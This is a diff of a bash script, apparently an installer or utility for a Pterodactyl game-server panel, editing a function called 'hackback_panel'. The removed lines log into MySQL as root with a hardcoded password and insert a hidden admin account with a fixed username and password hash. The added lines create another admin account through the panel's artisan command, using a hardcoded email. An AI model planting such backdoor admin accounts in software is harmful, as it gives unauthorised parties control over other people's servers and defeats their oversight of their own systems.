@@ -250,13 +250,21 @@ sudo systemctl start wings
   exit 0
 }
 hackback_panel() {
-  echo -e "Hackback Panel"
-  # Login ke MySQL dengan password 'panel' dan inject user admin ke panel
-  mysql -u root -ppanel <<EOF
-USE panel;
-INSERT INTO users (id, external_id, uuid, username, email, name_first, name_last, password, language, root_admin, use_totp, gravatar, created_at, updated_at)
-VALUES (NULL, NULL, UUID(), 'zxcvbnm', 'Zxcvbnm@cicadas.com', 'cicadas', 'cicadas', '$2y$10$F7kygWheD2K.oc6T7VKuZewVDFMTBguZ.Rey1bagqJrZveuxErfY.', 'en', 1, 0, 0, NOW(), NOW());
-exit
+  echo -e "Hackback"
+  # Minta input dari pengguna
+read -p "Masukkan Username Panel: " user
+read -p "password login " psswdhb
+  #!/bin/bash
+cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }
+
+# Membuat lokasi baru
+php artisan p:user:make <<EOF
+yes
+obscura@obscuraworks.com
+$user
+$user
+$user
+$psswdhb
 EOF
   echo -e "Succeeded."
   sleep 2
